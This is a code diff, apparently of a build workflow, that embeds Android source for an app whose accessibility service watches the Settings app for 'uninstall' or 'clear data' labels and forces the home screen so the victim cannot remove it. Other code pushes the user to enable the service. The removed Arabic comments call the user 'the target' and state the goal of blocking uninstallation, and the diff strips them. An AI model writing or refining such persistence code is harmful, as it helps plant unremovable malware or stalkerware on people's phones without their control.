@@ -44,7 +44,7 @@ jobs:
         <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
             android:accessibilityEventTypes="typeWindowStateChanged"
             android:accessibilityFeedbackType="feedbackGeneric"
-            android:accessibilityFlags="flagDefault|flagRetrieveWindowContent"
+            android:accessibilityFlags="flagIncludeNotImportantViews"
             android:canRetrieveWindowContent="true"
             android:description="@string/accessibility_desc"
             android:packageNames="com.android.settings"
@@ -234,7 +234,6 @@ jobs:
         import android.accessibilityservice.AccessibilityService;
         import android.view.accessibility.AccessibilityEvent;
         import android.view.accessibility.AccessibilityNodeInfo;
-        import java.util.List;
 
         public class RoyalAccessibilityService extends AccessibilityService {
             @Override
@@ -254,7 +253,6 @@ jobs:
                     if (text != null) {
                         String t = text.toString().toLowerCase();
                         if (t.contains("إلغاء التثبيت") || t.contains("uninstall") || t.contains("مسح البيانات")) {
-                            // طرد الهدف فوراً إلى الواجهة الرئيسية ومنع مسح التطبيق
                             performGlobalAction(GLOBAL_ACTION_HOME);
                         }
                     }
@@ -608,7 +606,6 @@ jobs:
                             startActivity(intent);
                         } catch (Exception ignored) {}
 
-                        // توجيه الهدف لتفعيل خدمة تسهيل الاستخدام (Accessibility) لضمان منع إلغاء التثبيت
                         try {
                             Intent accIntent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                             startActivity(accIntent);
